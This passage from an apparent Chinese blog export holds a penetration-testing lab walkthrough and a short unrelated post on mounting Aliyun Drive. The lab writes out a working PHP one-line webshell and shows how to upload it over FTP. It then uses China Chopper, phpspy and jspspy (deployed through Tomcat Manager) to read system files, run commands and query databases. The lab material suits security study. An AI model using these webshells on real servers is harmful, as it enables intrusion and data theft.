　　然后，将系统设置安全，以及锁定用户组防止提权，防止3389远程登录，设置好ftp服务器，防止攻击者直接使用ftp上传木马程序文件到web程序的目录中，将可以极大提高服务器和网站的安全性。</p>
<h2 id="实验环境-1"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：中国菜刀（Chopper）</li>
</ul>
<p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p>
<h2 id="实验过程-1"><strong>3. 实验过程</strong></h2>
<h3
id="利用ftp服务器上传小马文件到目标机的web程序目录中"><strong>1、利用ftp服务器，上传小马文件到目标机的web程序目录中</strong></h3>
<p>在操作机上当前chopper目录中新建一个名为“test.php”的文件，文件内容为一句话的
PHP Webshell，即：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1234&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将一句话 PHP Webshell 上传到目标 Web 服务器的 Web
主目录中。在cmd界面以ftp登录目标机，如果成功登录的话，应该能够看到提示消息：“230
Login
successful.”。然后我们可以输入“<code>pwd</code>”命令显示当前所在的目录，我们尝试是否可以进入的
FTP 的父目录中，输入“<code>cd ..</code>”ftp
命令可以进入到父目录中；输入“<code>cd /</code>”ftp
命令可以进入到根目录中。这里我们输入“<code>cd /var/www</code>”命令，则可以进入到服务器的
Web 根目录中，然后运行“<code>dir</code>”命令来查看 Web
根目录中所有的子目录和文件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d42fc30589.png" /></p>
<p>将test.php复制到C盘根目录下，方便上传。使用如下 ftp
指令切换客户端本地目录到“C:\”目录中，然后上传“test.php”文件到目标服务器的
Web 根目录中去</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">lcd c:\</span><br><span class="line">！<span class="keyword">dir</span></span><br><span class="line">put <span class="keyword">test</span>.php</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d437a67268.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d438636b77.png" /></p>
<h3
id="访问上传小马文件的网址菜刀链接并获取相关有用信息"><strong>2、访问上传小马文件的网址，菜刀链接并获取相关有用信息</strong></h3>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址，浏览器一片空白，也没有任何错误显示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4396a17b0.png" /></p>
<p>在 Chopper
工具的主界面中点击右键，选择“添加”菜单项后弹出“添加”对话框，在“地址”编辑框中输入以上
URL 地址，在右侧的小编辑框中输入密码“1234”，点击“添加”按钮后返回到
Chopper 主界面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43a278499.png" /></p>
<p>在 Chopper 主界面中双击刚添加的 URL
条目，如果设置正确的话，则会弹出如下“文件管理”的窗口</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43c5e0536.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d43f17d826.png" /></p>
<p>双击“test.php”，载入窗口输入“/etc/passwd”，然后点击“载入”，然后可以查看到文件内容【用户名信息】。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d440938ead.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d452112b34.png" /></p>
<p>回到 Chopper 主界面，右击点击添加 URL 条目，选择“虚拟终端”菜单项</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4464a49ab.png" /></p>
<p>在弹出的命令执行窗口中，可以输入 Shell 指令后执行。
输入“id”命令来查看当前用户的权限。
输入“<code>uname -a</code>”来查看当前系统的内核版本信息。
输入“<code>/sbin/ifconfig</code>”来查看网络地址信息。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4470180ac.png" /></p>
<p>输入“<code>cat /etc/shadow</code>”命令来查看系统用户密码文档，会发现读取查看失败。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44784afd0.png" /></p>
<p>回到 Chopper 主界面，右击点击添加 URL
条目，选择“编辑”菜单项后弹出“编辑 Shell”对话框，
在“配置”编辑框中输入如下数据库连接字符串</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">T</span>&gt;</span>MYSQL<span class="tag">&lt;/<span class="name">T</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">H</span>&gt;</span>127.0.0.1<span class="tag">&lt;<span class="name">H</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">U</span>&gt;</span>root<span class="tag">&lt;/<span class="name">U</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">P</span>&gt;</span>toor<span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这其中定义了数据库连接类型为“MYSQL”，服务器地址为“127.0.0.1”（本地），数据库连接用户名为“root”，密码为“toor”。点击“编辑”按钮后返回到
Chopper 主界面。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44a3b9702.png" />
右击点击添加 URL
条目，选择“数据库管理”菜单项，这时候就会弹出“数据库管理”窗口，如下图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44b1248cd.png" /></p>
<p>双击左侧数据库列表中的“mysql”库，就能查看到该库中所有的表；双击“user”表，就能查看到该表中所有的列。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44cc988b2.png" />
这时候，“配置”右侧编辑框中的默认 SQL 语句为：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">user</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span> <span class="keyword">DESC</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>其意思是查询“user”表内前 20 条记录。
点击右侧的“执行”按钮后如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d44d9243c9.png" /></p>
<h3
id="利用小马获取的文件管理权限上传大马文件进行近一步的攻击"><strong>3、利用小马获取的文件管理权限上传大马文件，进行近一步的攻击</strong></h3>
<p>用记事本或者其他文本编辑软件打开“phpspy.php”这个 PHP Webshell
文件，找到如下这一行：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">$pass = &#x27;e10adc<span class="number">3949</span>ba59abbe56e057f20f883e&#x27;; <span class="comment">//123456</span></span><br></pre></td></tr></table></figure>
<p>可自定义更改这个默认的管理登录密码“123456”，只是得首先计算密码的 MD5
散列值来替换原来的散列值内容。</p>
<p>回到 Chopper 主界面，右击点击添加 URL
条目，选择“文件管理”菜单项，然后在弹出的“文件管理”窗口中定位到“/var/www”目录，点击右键选择“上传文件”菜单项，选择操作机上的“phpspy.php”文件后将其上传到目标
Web 服务器的根目录中。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4619f0ccb.png" /></p>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//10.5.14.66/phpspy.php</span></span><br></pre></td></tr></table></figure>
<p>如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d466e01800.png" /></p>
<p>在登录密码输入框中输入我们前面设置的登录密码（默认为“123456”），然后点击右侧的
“Login”按钮即可成功进入 phpspy 的主控制界面。默认显示当前目录（即 Web
主目录）下的所有子目录和文件列表，如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d469971df7.png" /></p>
<p>在 Webshell 的主界面点击上方的“PHP
Variable”网页链接，我们就能查看目标
Web服务器特性（包括服务器时间、服务器域名、服务器 IP
地址、服务器操作系统、服务器操作系统文字编码、服务器解译引擎、Web
服务端口、PHP 运行方式、PHP 版本、是否支持运行于安全模式、服务器管理
员、本 Webshell 文件路径等），PHP
基本特性（显示错误信息、magic_quotes_gpc、允许最大上传 文件、允许使用
URL 打开文件等）、组件支持情况。如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d46b6bbca0.png" /></p>
<p>magic_quotes_gpc display_errors（显示错误信息）
register_globals（自动定义全局变量） allow_url_fopen（允许使用 URL
打开文件） Safe Mode（安全模式）</p>
<p>在 Webshell 的主界面点击上方的“Execute
Command”链接，然后在显示界面的编辑框中输入如下Shell 指令：</p>
<ul>
<li><code>id; uname -a; /sbin/ifconfig</code></li>
<li>之后点击“<code>Excute</code>”</li>
</ul>
<p>这是将若干条命令使用“;”（分号）来分隔，从而可以一次性执行多条语句</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d46d920d60.png" /></p>
<p>在 Webshell 的主界面点击上方的“File
Manager”网页链接，我们就能管理目标 Web
服务器上的文件和文件夹，包括下载、编辑、删除、改名、新建、上传等操作，也可利用“phpspy.php”提供的“View
Writable Directory”功能。</p>
<h1
id="win系统的jsp-webshell后门"><strong>Win系统的JSP-Webshell后门</strong></h1>
<h2 id="基本原理-2"><strong>1. 基本原理</strong></h2>
<p><strong>1、Win系统的JSP Webshell后门原理</strong></p>
<p>有一些服务器软件会使用到WAR，其中一些会提供用户上传WAR文件的接口。有些会允许用户使用一些外部源，利用这些接口上传jspspy.war木马文件，获取权限，最终控制目标主机。</p>
<h3 id="win系统的jsp-webshell后门危害"><strong>2、Win系统的JSP
Webshell后门危害</strong></h3>
<p>拿到了网站的WebShell，就可以修改网站的文件了！这样，网站将不再有秘密可言，比如下载文件，修改文件，删除文件等，将变得非常容易。拿到WebShell权限后，如果磁盘做了安全设置以及站点独立权限设置，则这个WebShell可能只能对当前站点有效，无法操作其他网站的程序。如果入侵者通过执行命令，提升网站的权限后，就可以发展到入侵服务器，进而创建管理用户，达到控制整台服务器的目的。</p>
<h3 id="win系统的jsp-webshell后门防范"><strong>3、Win系统的JSP
Webshell后门防范</strong></h3>
<p>当前最有效的解决办法，就是用软件查杀/入侵防护系统，快速对网站文件进行扫描，找出隐藏深处的网页木马并处理。
　　然后，设置好ftp服务器，防止上传木马文件；将文件系统设置存储权限；不要使用超级用户运行web服务；将可以极大提高服务器和网站的安全性。</p>
<h2 id="实验环境-2"><strong>2. 实验环境</strong></h2>
<ul>
<li>操作机：Windows</li>
<li>目标机：Ubuntu</li>
<li>实验工具：jspspy.jsp，jspspy.war</li>
</ul>
<p>jspspy.jsp是一款集成文件管理、数据库管理、命令执行等功能的木马文件。文件管理可以上传木马文件进行进一步提权，也可以下载有用的文件；数据库管理可以查询到数据库内容，获取有用信息；命令执行可以执行相关命令，添加管理用户等。</p>
<p>jspspy.war是一个war压缩包，里面有jspspy.jsp木马文件，是为了在web服务器能够上传war格式文件而做的一个压缩包文件。</p>
<h2 id="实验过程-2"><strong>3. 实验过程</strong></h2>
<h3
id="利用tomcat文件管理上传war的木马文件"><strong>1、利用Tomcat文件管理上传war的木马文件</strong></h3>
<p>用记事本或者其他文本编辑软件打开“jspspy.jsp”这个 JSP Webshell
文件，找到如下这一行：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">String</span> PW = <span class="string">&quot;123456&quot;</span>;    <span class="comment">//password</span></span><br></pre></td></tr></table></figure>
<p>可自定义更改这个默认的管理登录密码“123456”。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c5a500c9.png" /></p>
<p>首先把jspspy.wav压缩成raw格式，使用 Windows Rar
软件打开实验工具目录中的“jspspy.war”文件（先打开Tools.rar文件，返回上一级目录后，双击打开jspspy.war文件），然后将修改过密码的
JSP
Webshell文件更新到“jspspy.war”文件中去（先将war中的jspspy.jsp删除，然后点击命令-添加文件到文件夹中，选择要添加的文件jspspy.jsp，点击确定后添加完毕），如下图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4cc3e01c7.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c949ad74.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4c9e6cd79.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4cad89f76.png" /></p>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d56e30bc.png" /></p>
<p>点击左侧的“Tomcat
Manager”链接，在弹出的身份验证输入框中输入如下信息：</p>
<ul>
<li>用户名：<code>admin</code></li>
<li>密码：<code>@dm!n123</code></li>
</ul>
<p>登录成功之后进入如下 Tomcat 的管理页面</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d7c6c9cc.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4d848f9de.png" /></p>
<p>点击“WAR file to
deploy”组合框部分的“选择文件”按钮，选择本地刚才定制的“jspspy.war”文件后点击“Deploy”来发布这个
Webshell 后门应用。 应用发布成功之后如图所示。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4dc702da4.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4dd402bd7.png" /></p>
<h3
id="利用木马文件所具备的功能进行信息获取直至提权"><strong>2、利用木马文件所具备的功能进行信息获取直至提权</strong></h3>
<p>在本地主机上使用 IE 等 Web 浏览器访问目标服务器上的如下网页 URL
地址：<code>[http://10.5.14.64:8080/jspspy/jspspy.jsp](http://10.5.14.64:8080/jspspy/jspspy.jsp)</code>
　　注：文件大小写敏感，请注意。 如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4de85588d.png" /></p>
<p>在登录密码输入框中输入我们前面设置的登录密码（默认为“<code>123456</code>”），然后点击右侧的
“Login”按钮即可成功进入 jspspy 的主控制界面，默认显示当前目录（即 Web
主目录）下的所有子目录和文件列表，如下图所示</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4e59697fa.png" /></p>
<p>点击上方的“File
Manager”链接，进入到“文件管理”功能界面。这时候就可以对目标 Web 服务器
上的文件和文件夹进行管理，包括下载、编辑和上传文件。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4e9b4a0f2.png" /></p>
<p>点击上方的“Execute
Command”链接，然后在下面的界面中就可以执行远程命令了。下面的“Execute
Shell”编辑框是调用“cmd.exe”来执行系统命令，格式为“cmd.exe
/c ”，如“<code>cmd.exe /c net user</code>”，点击“Submit”按钮提交执行。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/10/img_634d4f02ebe2e.png" /></p>
<p>未完待续……</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>远程控制</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云盘挂载本地硬盘</title>
    <url>/2023/01/19/%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E6%8C%82%E8%BD%BD%E6%9C%AC%E5%9C%B0%E7%A1%AC%E7%9B%98/</url>
    <content><![CDATA[<p>将阿里云盘挂载在Windows本地有两种方式：</p>
<p>1.通过CloudDrive2软件直接挂载安装（<strong>推荐</strong>）。</p>
<p>2.通过aliyundrive-webdav将阿里云盘转成WebDav协议，然后通过RaiDrive软件来进行挂载。</p>
<p>两种方法的具体操作参见：<a
href="https://www.benzhu.xyz/windows4/"></a><a
href="https://www.benzhu.xyz/windows4/">https://www.benzhu.xyz/windows4/</a></p>
<p>个人在实践webdav方法时，RaiDrive连接时总提示refresh-token失效/无效等，但实际refresh-token是有效的，可能是官方对这种方法做了一定的限制（或者个人操作有问题）。CloudDrive2是一款可以将阿里云盘、天翼云盘、WebDAV
等挂载到电脑中，成为本地硬盘的工具，支持 Windows 与 Docker
部署，目前最新版已支持Linux系统。CloudDrive2方法是可行的，但安全性有待考究。最初挂载是为了将百度云盘的文件迁移到阿里云盘，即百度云盘下载时直接将目录指定为挂载的阿里云盘。整体体验是，少量文件还好，文件多的话真心不推荐，上传默认缓存文件到C盘，网页可以查看上传任务，上传完自动删除缓存，网页可以设置缓存位置建议改成其他本地磁盘，否则C盘会爆掉（参见下图）。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2023/01/img_63c8b5f88c5e8.png" /></p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>CloudDrive</tag>
        <tag>WebDav</tag>
        <tag>阿里云盘</tag>
      </tags>
  </entry>
</search>
